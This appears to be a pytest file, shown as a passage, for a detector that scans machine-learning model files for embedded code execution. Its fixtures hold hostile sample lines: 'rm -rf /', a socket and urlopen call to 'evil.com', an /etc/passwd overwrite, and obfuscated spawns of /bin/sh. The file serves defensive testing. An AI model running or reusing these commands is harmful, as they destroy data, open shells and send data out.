"""Tests for JIT/Script code execution detection."""

import ast
from pathlib import Path
from typing import Any

import pytest

from modelaudit.detectors import jit_script as jit_script_module
from modelaudit.detectors.jit_script import JITScriptDetector, detect_jit_script_risks


class TestJITScriptDetector:
    """Test the JITScriptDetector class."""

    def test_detect_dangerous_torch_ops(self):
        """Test detection of dangerous TorchScript operations."""
        detector = JITScriptDetector()

        # Create fake TorchScript data with dangerous operations
        data = b"""
        TorchScript-1.0
        def forward(self, x):
            torch.ops.aten.system("rm -rf /")
            torch.ops.aten.exec("malicious code")
            return x
        """

        findings = detector.scan_torchscript(data, "test_model.pt")
        assert len(findings) >= 2
        assert any("torch.ops.aten.system" in getattr(f, "pattern", getattr(f, "operation", "")) for f in findings)
        assert any("torch.ops.aten.exec" in getattr(f, "pattern", getattr(f, "operation", "")) for f in findings)
        assert all(
            getattr(f, "severity", getattr(f, "severity", "")) == "CRITICAL"
            for f in findings
            if hasattr(f, "pattern") or hasattr(f, "operation")
        )

    def test_detect_torch_jit_compilation(self):
        """Test detection of TorchScript JIT compilation."""
        detector = JITScriptDetector({"strict_mode": True})

        # Create data with JIT markers
        data = b"""
        torch.jit.script
        @torch.jit.compile
        def model_func():
            pass
        """

        findings = detector.scan_torchscript(data, "jit_model.pt")
        assert any(f.type == "jit_usage" for f in findings)

    def test_detect_embedded_pickle_in_torch(self):
        """Test detection of embedded pickle in TorchScript."""
        detector = JITScriptDetector()

        # Simulate TorchScript with pickle opcodes
        data = b"TorchScript\x00GLOBAL torch.nn Module\x00"

        findings = detector.scan_torchscript(data)
        assert any(f.type == "embedded_pickle" for f in findings)
        assert any("pickle" in f.message.lower() for f in findings)

    def test_detect_dangerous_tf_ops(self):
        """Test detection of dangerous TensorFlow operations."""
        detector = JITScriptDetector()

        # Create fake TensorFlow SavedModel data
        data = b"""
        saved_model.pb
        tf.py_func(lambda x: exec('malicious'), [input])
        tf.numpy_function(dangerous_func, [x], tf.float32)
        """

        findings = detector.scan_tensorflow(data, "model.pb")
        assert len(findings) >= 2
        assert any(f.operation is not None and "tf.py_func" in f.operation for f in findings)
        assert any(f.operation is not None and "tf.numpy_function" in f.operation for f in findings)

    def test_detect_keras_lambda_layers(self):
        """Test detection of Keras Lambda layers."""
        detector = JITScriptDetector()

        # Create data with Keras Lambda layer
        data = b"""
        tensorflow.keras.layers.Lambda
        lambda x: eval(x)
        """

        findings = detector.scan_tensorflow(data)
        assert any(f.type == "lambda_layer" for f in findings)
        assert any("Lambda" in f.message for f in findings)

    def test_detect_onnx_custom_operators(self):
        """Test detection of ONNX custom operators."""
        detector = JITScriptDetector()

        # Create fake ONNX data with custom operators
        data = b"""
        ai.onnx.contrib.custom_op
        PythonOp: eval_code
        """

        findings = detector.scan_onnx(data, "model.onnx")
        assert any(f.type == "custom_operator" for f in findings)
        assert any(f.type == "python_operator" for f in findings)

    def test_detect_dangerous_imports_in_code(self):
        """Test detection of dangerous imports in embedded code."""
        detector = JITScriptDetector()

        # Create data with embedded Python code containing dangerous imports
        data = b"""
        def malicious_function():
            import os
            import subprocess
            os.system('evil command')
            subprocess.call(['rm', '-rf', '/'])
        """

        findings = detector._extract_and_check_python_code(data, "Test", "test.model")
        assert any("os" in getattr(f, "import_", "") for f in findings)
        assert any("subprocess" in getattr(f, "import_", "") for f in findings)
        assert any(f.severity == "CRITICAL" for f in findings)

    def test_known_dangerous_import_reuses_compiled_patterns(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Known import checks should not rebuild regex source at call time."""

        def fail_escape(_value: str) -> str:
            raise AssertionError("known import checks should reuse compiled patterns")

        monkeypatch.setattr(jit_script_module.re, "escape", fail_escape)

        assert JITScriptDetector._contains_dangerous_import("import os\n", "os") is True

    def test_scan_torchscript_checks_unmarked_python_blobs(self) -> None:
        """Raw Python payloads should be analyzed even without TorchScript markers."""
        detector = JITScriptDetector()
        data = b"""
        def payload():
            import os
            return os.system("echo pwned")
        """

        findings = detector.scan_torchscript(data, "opaque.bin")

        assert any(getattr(finding, "import_", "") == "os" for finding in findings)

    def test_detect_dangerous_builtins(self):
        """Test detection of dangerous builtins like eval, exec."""
        detector = JITScriptDetector()

        data = b"""
        def process_input(x):
            result = eval(x)
            exec(compile(x, 'string', 'exec'))
            return __import__('os').system(result)
        """

        findings = detector._extract_and_check_python_code(data, "Test", "test.model")
        assert any("eval" in getattr(f, "builtin", "") for f in findings)
        assert any("exec" in getattr(f, "builtin", "") for f in findings)
        assert any("__import__" in getattr(f, "builtin", "") for f in findings)

    def test_detect_dangerous_builtin_alias_assigned_by_tuple_unpacking(self) -> None:
        detector = JITScriptDetector()
        data = b"""
        def process_input(x):
            (sink,) = (eval,)
            return sink(x)
        """

        findings = detector._extract_and_check_python_code(data, "Test", "test.model")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    def test_dangerous_builtin_alias_tuple_unpacking_can_be_shadowed(self) -> None:
        detector = JITScriptDetector()
        data = b"""
        def process_input(x):
            sink = eval
            (sink,) = (len,)
            return sink(x)
        """

        findings = detector._extract_and_check_python_code(data, "Test", "test.model")

        assert not any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    def test_detect_code_execution_patterns(self):
        """Test detection of code execution patterns in binary data."""
        detector = JITScriptDetector()

        # Create data with various execution patterns
        data = b"""
        subprocess.run(['malicious', 'command'])
        os.system('rm -rf /')
        socket.create_connection(('evil.com', 1337))
        urllib.request.urlopen('http://evil.com/steal')
        open('/etc/passwd', 'w').write('hacked')
        """

        findings = detector._extract_and_check_python_code(data, "Test", "test.model")
        assert any("subprocess" in getattr(f, "pattern", "").lower() for f in findings)
        assert any("os command" in getattr(f, "pattern", "").lower() for f in findings)
        assert any("socket" in getattr(f, "pattern", "").lower() for f in findings)

    def test_auto_detect_model_type(self) -> None:
        """Test automatic model type detection."""
        detector = JITScriptDetector()

        # Test PyTorch detection
        pytorch_data = b"TorchScript model data"
        pytorch_findings = detector.scan_model(pytorch_data, "unknown")
        assert isinstance(pytorch_findings, list)

        # Test TensorFlow detection
        tf_data = b"saved_model.pb tensorflow data"
        tf_findings = detector.scan_model(tf_data, "unknown")
        assert isinstance(tf_findings, list)

        # Test ONNX detection
        onnx_data = b"ai.onnx model data"
        onnx_findings = detector.scan_model(onnx_data, "unknown")
        assert isinstance(onnx_findings, list)

    def test_scan_model_detects_unmarked_dangerous_python_source(self) -> None:
        detector = JITScriptDetector()
        data = b"""
        def payload():
            import os
            return eval("1 + 1") or os.system("id")
        """

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)
        assert any(f.type == "dangerous_builtin" and f.builtin == "eval" for f in findings)

    def test_scan_model_ignores_unmarked_benign_python_source(self) -> None:
        detector = JITScriptDetector()
        data = b"""
        def normalize(values):
            total = sum(values)
            return [value / total for value in values]
        """

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_ignores_non_source_dangerous_text(self) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(b"metadata says eval( is unsupported", "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_detects_unmarked_module_scope_python_source(self) -> None:
        detector = JITScriptDetector()
        findings = detector.scan_model(b"import os\nos.system('id')\n", "pytorch", "payload.bin")

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)

    def test_scan_model_detects_late_unmarked_module_scope_python_source(self) -> None:
        detector = JITScriptDetector()
        data = b"# pad\n" * 200000 + b"import os\nos.system('id')\n"

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)

    def test_extract_embedded_python_marks_byte_budget_incomplete(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * ((jit_script_module._EMBEDDED_PYTHON_EXTRACT_BYTE_LIMIT // len(b"# pad\n")) + 1)
        data = padding + b"import os\nos.system('id')\n"

        findings = detector._extract_and_check_python_code(data, "TorchScript", "late_payload.pt")

        incomplete = [
            finding
            for finding in findings
            if finding.type == "analysis_incomplete"
            and finding.details.get("reason") == jit_script_module._EMBEDDED_PYTHON_BYTE_LIMIT_REASON
        ]
        assert len(incomplete) == 1
        assert incomplete[0].details["max_scan_bytes"] == jit_script_module._EMBEDDED_PYTHON_EXTRACT_BYTE_LIMIT
        assert not any(finding.type == "dangerous_import" and finding.import_ == "os" for finding in findings)

    def test_scan_model_ignores_large_tensorflow_function_metadata_without_python(self) -> None:
        detector = JITScriptDetector()
        data = b"SavedFunction function_spec\n" + b"A" * (jit_script_module._EMBEDDED_PYTHON_EXTRACT_BYTE_LIMIT + 100)

        findings = detector.scan_model(data, "tensorflow", "saved_model.pb")

        assert not any(finding.type == "analysis_incomplete" for finding in findings)

    def test_scan_model_marks_late_tensorflow_function_source_incomplete(self) -> None:
        detector = JITScriptDetector()
        data = (
            b"SavedFunction function_spec\n"
            + b"A" * (jit_script_module._EMBEDDED_PYTHON_EXTRACT_BYTE_LIMIT + 100)
            + b"\nimport os\nos.system('id')\n"
        )

        findings = detector.scan_model(data, "tensorflow", "saved_model.pb")

        assert any(
            finding.type == "analysis_incomplete"
            and finding.details.get("reason") == jit_script_module._EMBEDDED_PYTHON_BYTE_LIMIT_REASON
            for finding in findings
        )

    def test_extract_embedded_python_marks_boundary_spanning_source_incomplete(self) -> None:
        detector = JITScriptDetector()
        data = (
            b"A" * (jit_script_module._EMBEDDED_PYTHON_EXTRACT_BYTE_LIMIT - len(b"\nimport "))
            + b"\nimport os\nos.system('id')\n"
        )

        findings = detector._extract_and_check_python_code(data, "TorchScript", "boundary_payload.pt")

        assert any(
            finding.type == "analysis_incomplete"
            and finding.details.get("reason") == jit_script_module._EMBEDDED_PYTHON_BYTE_LIMIT_REASON
            for finding in findings
        )

    @pytest.mark.parametrize(
        "header",
        [
            b"def payload():\n    values = (\n",
            b"class Payload:\n    values = (\n",
        ],
    )
    def test_extract_embedded_python_marks_long_unparseable_definition_incomplete(self, header: bytes) -> None:
        detector = JITScriptDetector()
        continuation = b"        1,\n"
        data = (
            header
            + continuation * (jit_script_module._EMBEDDED_PYTHON_EXTRACT_BYTE_LIMIT // len(continuation) + 1)
            + b"    )\n"
        )

        findings = detector._extract_and_check_python_code(data, "TorchScript", "long_definition.pt")

        assert any(
            finding.type == "analysis_incomplete"
            and finding.details.get("reason") == jit_script_module._EMBEDDED_PYTHON_BYTE_LIMIT_REASON
            for finding in findings
        )

    @pytest.mark.parametrize(
        "prose",
        [
            b"def payload is described here\n",
            b"class Payload is described here\n",
        ],
    )
    def test_scan_model_ignores_large_definition_like_prose(self, prose: bytes) -> None:
        detector = JITScriptDetector()
        data = prose + b"A" * (jit_script_module._EMBEDDED_PYTHON_EXTRACT_BYTE_LIMIT + 100)

        findings = detector.scan_model(data, "pytorch", "definition_prose.pt")

        assert not any(finding.type == "analysis_incomplete" for finding in findings)

    def test_scan_model_does_not_duplicate_import_only_pytorch_source_findings(self) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(b'import os\nos.system("id")\n', "pytorch", "payload.pt")

        finding_signatures = {
            (finding.type, finding.pattern, finding.import_, finding.operation, finding.message) for finding in findings
        }
        assert len(findings) == 3
        assert len(finding_signatures) == len(findings)

    def test_scan_model_marks_import_only_omitted_middle_incomplete(self) -> None:
        detector = JITScriptDetector()
        padding = b"A" * (jit_script_module._EMBEDDED_PYTHON_EXTRACT_BYTE_LIMIT + 100)
        data = b"\x00\xff" + padding + b"\nimport harmless_middle\n" + padding

        findings = detector.scan_model(data, "pytorch", "middle_import.pt")

        assert any(
            finding.type == "analysis_incomplete"
            and finding.details.get("reason") == jit_script_module._EMBEDDED_PYTHON_BYTE_LIMIT_REASON
            for finding in findings
        )

    def test_scan_model_ignores_large_prose_import_in_omitted_middle(self) -> None:
        detector = JITScriptDetector()
        padding = b"A" * (jit_script_module._EMBEDDED_PYTHON_EXTRACT_BYTE_LIMIT + 100)
        prose = b"\ninstructions import numpy for setup\nimport numpy is required by this model\n"
        data = b"\x00\xff" + padding + prose + padding

        findings = detector.scan_model(data, "pytorch", "prose_import.pt")

        assert not any(finding.type == "analysis_incomplete" for finding in findings)

    def test_scan_model_ignores_large_import_near_match(self) -> None:
        detector = JITScriptDetector()
        data = b"metadata_import harmless\n" * (
            jit_script_module._EMBEDDED_PYTHON_EXTRACT_BYTE_LIMIT // len(b"metadata_import harmless\n") + 1
        )

        findings = detector.scan_model(data, "pytorch", "metadata.pt")

        assert not any(finding.type == "analysis_incomplete" for finding in findings)

    def test_scan_model_fails_closed_after_source_start_probe_budget(self) -> None:
        detector = JITScriptDetector()
        data = b"\n".join(
            f"import harmless_{index} is prose".encode()
            for index in range(jit_script_module._MAX_EMBEDDED_PYTHON_SOURCE_START_PROBES + 1)
        )

        findings = detector.scan_model(data, "pytorch", "many_ambiguous_imports.pt")

        assert any(finding.type == "analysis_incomplete" for finding in findings)

    def test_extract_embedded_python_marks_snippet_budget_incomplete(self) -> None:
        detector = JITScriptDetector()
        data = b"\x00".join(
            f"import harmless_{index}".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )

        findings = detector._extract_and_check_python_code(data, "TorchScript", "many_snippets.pt")

        incomplete = [
            finding
            for finding in findings
            if finding.type == "analysis_incomplete"
            and finding.details.get("reason") == jit_script_module._EMBEDDED_PYTHON_SNIPPET_LIMIT_REASON
        ]
        assert len(incomplete) == 1
        assert incomplete[0].details["omitted_snippets"] > 0
        assert incomplete[0].details["candidate_snippets"] > jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS

    def test_extract_embedded_python_keeps_fully_covered_over_budget_source_clean(self) -> None:
        detector = JITScriptDetector()
        data = b"\n".join(
            f"import harmless_{index}".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )

        findings = detector._extract_and_check_python_code(data, "TorchScript", "covered_snippets.pt")

        assert not any(
            finding.type == "analysis_incomplete"
            and finding.details.get("reason") == jit_script_module._EMBEDDED_PYTHON_SNIPPET_LIMIT_REASON
            for finding in findings
        )

    def test_extract_embedded_python_keeps_benign_within_budgets_clean(self) -> None:
        detector = JITScriptDetector()
        data = b"\n".join(
            f"import harmless_{index}".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS)
        )

        findings = detector._extract_and_check_python_code(data, "TorchScript", "benign_snippets.pt")

        assert findings == []

    def test_scan_model_detects_unmarked_from_import_source(self) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(b"from os import system as run\nrun('id')\n", "pytorch", "payload.bin")

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)

    @pytest.mark.parametrize(
        "source",
        [
            b"def payload():\n    return os.posix_spawn('/bin/sh', ['sh'], {})\n",
            b"def payload():\n    return os.posix_spawnp('sh', ['sh'], {})\n",
            b"def payload():\n    return os.startfile('payload.exe')\n",
            b"def payload():\n    return getattr(os, 'posix_' + 'spawn')('/bin/sh', ['sh'], {})\n",
            b"def payload():\n    os.posix_spawn = len\n    return os.posix_spawn([])\n",
            b"def payload(data):\n    os.posix_spawn = pickle.loads\n    return os.posix_spawn(data)\n",
        ],
    )
    def test_scan_model_detects_os_process_launch_source_conservatively(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_ignores_string_literal_os_process_launch(self) -> None:
        detector = JITScriptDetector()
        source = b"def payload():\n    return \"os.posix_spawn('/bin/sh', ['sh'], {})\"\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_ignores_binary_framed_string_literal_os_process_launch(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffdef payload():\n    return \"os.posix_spawn('/bin/sh', ['sh'], {})\"\n}"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_ignores_string_literal_os_process_launch_with_unrelated_risk(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"import pickle\n\n"
            b"def payload(data):\n"
            b"    pickle.loads(data)\n"
            b"    return \"os.posix_spawn('/bin/sh', ['sh'], {})\"\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            (
                b"import os\n"
                b"import subprocess\n\n"
                b"def payload(args):\n"
                b"    marker = os.posix_spawn\n"
                b"    return subprocess.list2cmdline(args)\n"
            ),
            (
                b"import os\n"
                b"import subprocess\n\n"
                b"def payload():\n"
                b"    marker = os.posix_spawn\n"
                b"    return subprocess.run(['echo', 'ok'], check=False)\n"
            ),
        ],
    )
    def test_scan_model_ignores_uninvoked_os_process_reference_with_unrelated_risk(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_detects_embedded_snippet_alias_aware_os_process_launch(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import os\n"
            b"    return getattr(os, 'posix_' + 'spawn')('/bin/sh', ['sh'], {})\n"
            b"}"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_detects_embedded_snippet_alias_aware_os_process_launch_before_binary_tail(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import os\n"
            b"    return getattr(os, 'posix_' + 'spawn')('/bin/sh', ['sh'], dict())\n"
            b"\x00\xffMODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_detects_framed_module_import_alias_aware_os_process_launch(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffimport os\ndef payload():\n    return getattr(os, 'posix_' + 'spawn')('/bin/sh', ['sh'], {})\n}"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_allows_framed_benign_dict_literal_os_accessor(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffdef payload():\n    import os\n    return {'cwd': getattr(os, 'getcwd')()}\n}"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            b"async def payload():\n    return await asyncio.create_subprocess_shell('id')\n",
            b"async def payload():\n    return await asyncio.subprocess.create_subprocess_exec('id')\n",
            (
                b"from asyncio import create_subprocess_exec as launch\n"
                b"async def payload():\n    return await launch('id')\n"
            ),
            (
                b"async def payload():\n"
                b"    asyncio.create_subprocess_shell = len\n"
                b"    return asyncio.create_subprocess_shell([])\n"
            ),
            (
                b"async def payload(data):\n"
                b"    asyncio.create_subprocess_exec = pickle.loads\n"
                b"    return asyncio.create_subprocess_exec(data)\n"
            ),
        ],
    )
    def test_scan_model_detects_asyncio_subprocess_launch_source_conservatively(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_scan_model_ignores_string_literal_asyncio_subprocess_launch_with_unrelated_risk(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"import pickle\n\n"
            b"def payload(data):\n"
            b"    pickle.loads(data)\n"
            b"    return \"asyncio.create_subprocess_shell('id')\"\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_scan_model_ignores_binary_framed_string_literal_asyncio_subprocess_launch(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffdef payload():\n    return \"asyncio.create_subprocess_shell('id')\"\n\x00\xffMODEL-FRAMING"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_scan_model_ignores_lossy_decoded_string_literal_asyncio_subprocess_launch(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    # ignored invalid bytes: "
            + (b"\xff" * 64)
            + b"\n    return \"asyncio.create_subprocess_shell('id')\"\n\x00\xffMODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_parse_embedded_python_snippet_caps_trim_attempts(self, monkeypatch: pytest.MonkeyPatch) -> None:
        parse_calls = 0

        def fail_parse(_source: str) -> ast.AST:
            nonlocal parse_calls
            parse_calls += 1
            raise SyntaxError("bad syntax", ("<embedded>", 1, 1, "bad"))

        monkeypatch.setattr(jit_script_module.ast, "parse", fail_parse)

        tree = jit_script_module._parse_embedded_python_snippet(
            "def payload():\n" + "\n".join("bad" for _ in range(1000))
        )

        assert tree is None
        assert parse_calls <= jit_script_module._MAX_SNIPPET_PARSE_TRIM_ATTEMPTS + 2

    def test_scan_model_detects_binary_framed_long_tail_alias_aware_asyncio_subprocess_launch(self) -> None:
        detector = JITScriptDetector()
        tail = b"\n".join(b"tail" for _ in range(jit_script_module._MAX_SNIPPET_PARSE_TRIM_ATTEMPTS + 20))
        source = (
            b"\x00\xffdef payload():\n"
            b"    from asyncio import create_subprocess_shell as launch\n"
            b"    return launch('id')\n"
            b"\x00" + tail
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_scan_model_detects_binary_framed_long_tail_alias_aware_os_process_launch(self) -> None:
        detector = JITScriptDetector()
        tail = b"\n".join(b"tail" for _ in range(jit_script_module._MAX_SNIPPET_PARSE_TRIM_ATTEMPTS + 20))
        source = b"\x00\xffdef payload():\n    import os as o\n    return getattr(o, 'system')('id')\n\x00" + tail

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_preserves_raw_asyncio_match_in_unparsed_snippet_after_benign_parse(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def benign():\n"
            b"    return \"asyncio.create_subprocess_shell('id')\"\n"
            b"}\n"
            b"def payload():\n"
            b"if True print('broken')\n"
            b"asyncio.create_subprocess_shell('id')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_scan_model_detects_embedded_snippet_alias_aware_asyncio_subprocess_launch(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    from asyncio import create_subprocess_shell as launch\n"
            b"    return launch('id')\n"
            b"}"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            b"def payload():\n    return runpy._run_module_as_main('payload')\n",
            b"def payload():\n    return runpy.run_module('payload')\n",
            b"def payload():\n    from runpy import run_path as run\n    return run('payload.py')\n",
        ],
    )
    def test_scan_model_detects_unmarked_runpy_execution(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_certain_replaced_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = b"def payload():\n    runpy.run_path = len\n    return runpy.run_path([])\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_ignores_runpy_member_after_module_alias_rebind(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"class Safe:\n"
            b"    run_path = len\n"
            b"def payload():\n"
            b"    import runpy as rp\n"
            b"    rp = Safe()\n"
            b"    return rp.run_path([])\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_possible_runpy_execution_after_conditional_replacement(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def payload():\n    if replace:\n        runpy.run_path = len\n    return runpy.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_binary_prefixed_aliased_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffdef payload():\n    from runpy import run_path as run\n    return run('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_binary_framed_top_level_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xfffrom runpy import run_path as run\nrun('payload.py')\n\x00MODEL-FRAMING"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_window_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00" * (jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES + 16)
            + b"\x00\xfffrom runpy import run_path as run\nrun('payload.py')\n\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_priority_runpy_snippet_after_harmless_imports(self) -> None:
        detector = JITScriptDetector()
        leading_imports = b"".join(f"import harmless_{index}\n\x00".encode() for index in range(12))
        source = b"\x00\xff" + leading_imports + b"from runpy import run_path as run\nrun('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_priority_runpy_import_list_alias(self) -> None:
        detector = JITScriptDetector()
        leading_imports = b"".join(f"import harmless_{index}\n\x00".encode() for index in range(12))
        source = b"\x00\xff" + leading_imports + b"import harmless as h, runpy as rp\nrp.run_path('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_priority_runpy_continued_import_list_alias(self) -> None:
        detector = JITScriptDetector()
        leading_imports = b"".join(f"import harmless_{index}\n\x00".encode() for index in range(12))
        source = (
            b"\x00\xff" + leading_imports + b"import harmless as h, \\\n    runpy as rp\nrp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "continued_import",
        [
            b"from runpy\\\n import run_path as run\n",
            b"from runpy \\\n import run_path as run\n",
            b"from runpy\\\r\n import run_path as run\r\n",
            b"from runpy \\\r\n import run_path as run\r\n",
        ],
    )
    def test_scan_model_detects_late_priority_runpy_continued_from_import(self, continued_import: bytes) -> None:
        detector = JITScriptDetector()
        leading_imports = b"".join(f"import harmless_{index}\n\x00".encode() for index in range(12))
        source = b"\x00\xff" + leading_imports + continued_import + b"run('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_priority_runpy_import_after_large_function_preamble(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding = b"    # pad\n" * 600
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"def payload():\n"
            + padding
            + b"    import runpy as rp\n"
            + b"    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_reports_tail_runpy_after_prefix_overwrite_across_gap(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy\n"
            b"runpy.run_path = len\n" + filler + b"def payload():\n    return runpy.run_path([])\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_reports_tail_runpy_when_omitted_middle_may_restore_overwrite(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
